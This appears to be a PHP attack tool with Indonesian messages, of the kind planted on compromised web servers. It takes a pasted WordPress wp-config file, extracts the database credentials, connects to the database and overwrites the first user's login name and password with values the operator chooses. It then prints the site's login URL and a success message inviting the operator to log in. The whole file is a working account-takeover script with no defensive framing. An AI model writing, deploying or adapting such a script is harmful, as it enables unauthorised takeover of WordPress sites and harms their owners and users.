<title>./Xi4u7 <3</title>
<?php
error_reporting(0);

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(isset($_POST['hajar'])) {
	echo $_POST["config"];
	if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
		echo "username atau password harus lebih dari 6 karakter";
	} else {
		$user_baru = $_POST['user_baru'];
		$pass_baru = md5($_POST['pass_baru']);
		$config = $_POST["config"];
		$dbhost = ambilkata($config,"DB_HOST', '","'");
		$dbuser = ambilkata($config,"DB_USER', '","'");
		$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
		$dbname = ambilkata($config,"DB_NAME', '","'");
		$dbprefix = ambilkata($config,"table_prefix  = '","'");
		$prefix = $dbprefix."users";
		$option = $dbprefix."options";
		$conn = new mysqli($dbhost,$dbuser,$dbpass,$dbname);
		$q = $conn->query("SELECT * FROM $prefix ORDER BY id ASC");
		$result = $q->fetch_array();
		$id = $result[ID];
		$q2 = $conn->query("SELECT * FROM $option ORDER BY option_id ASC");
		$result2 = $q2->fetch_array();
		$target = $result2[option_value];
		if($target == '') {
			$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
		} else {
			$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
		}
		$update = $conn->query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
		echo "Config => ".$file_conf."<br>";
		echo "CMS => Wordpress<br>";
		echo $url_target;
		if(!$update OR !$conn) {
			echo "Status => <font color=red>".$conn->error."</font><br><br>";
		} else {
			echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
		}
		$conn->close();
	}
} else {
	echo "Only Allowed Method POST!";
}
?>
